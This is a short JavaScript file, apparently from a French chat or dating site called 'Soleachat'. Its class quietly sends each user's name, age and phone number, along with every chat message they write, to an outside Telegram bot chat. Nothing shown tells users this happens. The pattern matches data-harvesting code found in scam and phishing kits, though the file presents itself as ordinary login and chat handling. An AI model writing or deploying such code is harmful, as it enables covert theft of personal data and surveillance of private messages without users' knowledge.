class TelegramManager {
    constructor() {
        this.botToken = CONFIG.TELEGRAM_BOT_TOKEN;
        this.chatId = CONFIG.TELEGRAM_CHAT_ID;
        this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
    }

    async sendMessage(text) {
        try {
            const response = await fetch(`${this.apiUrl}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
            return await response.json();
        } catch (error) {
            console.error('Erreur envoi message Telegram:', error);
            throw error;
        }
    }

    async notifyLogin(userData) {
        const message = `
💕 <b>BIENVENUE SUR SOLEACHAT</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Nom:</b> ${userData.firstName} ${userData.lastName}
📅 <b>Âge:</b> ${userData.age} ans
📱 <b>Téléphone:</b> ${userData.phoneNumber}
🕐 <b>Connexion:</b> ${new Date().toLocaleString('fr-FR')}
━━━━━━━━━━━━━━━━━━━━━━
✅ Connecté avec succès
        `;

        return await this.sendMessage(message);
    }

    async logChatMessage(messageData) {
        const notif = `
💬 <b>MESSAGE CHAT</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>De:</b> ${messageData.senderName}
💭 <b>Message:</b> ${messageData.text}
🕐 <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
        `;

        return await this.sendMessage(notif);
    }

    saveUser(userData) {
        const users = JSON.parse(localStorage.getItem('soleachat_users') || '{}');
        users[userData.phoneNumber] = {
            ...userData,
            lastLogin: new Date().toISOString(),
            isOnline: true
        };
        localStorage.setItem('soleachat_users', JSON.stringify(users));
    }
}

const telegramManager = new TelegramManager();
window.telegramManager = telegramManager;